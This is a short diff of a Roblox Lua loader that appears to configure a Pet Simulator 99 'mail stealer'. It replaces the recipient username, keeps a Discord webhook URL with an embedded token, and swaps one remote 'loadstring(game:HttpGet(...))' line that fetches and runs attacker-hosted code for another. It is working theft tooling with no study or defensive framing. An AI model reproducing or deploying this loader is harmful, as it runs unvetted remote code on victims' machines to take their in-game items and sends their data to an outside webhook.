@@ -1,4 +1,4 @@
-Username = "Devbanshee"
-LoadScreen = true 
-Webhook = "https://discord.com/api/webhooks/1271698295999172608/LCv6BmqtQ_-qlsBVENrIMbEG_jQAu3sv6plH518f8CrXfT1EQOBeh8BoJX1uD5L0YYqX"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+Username = 'Jacob_tube707'
+Webhook = 'https://discord.com/api/webhooks/1271698295999172608/LCv6BmqtQ_-qlsBVENrIMbEG_jQAu3sv6plH518f8CrXfT1EQOBeh8BoJX1uD5L0YYqX'
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/terabite-max43/shitescripts/main/configs.lua"))()
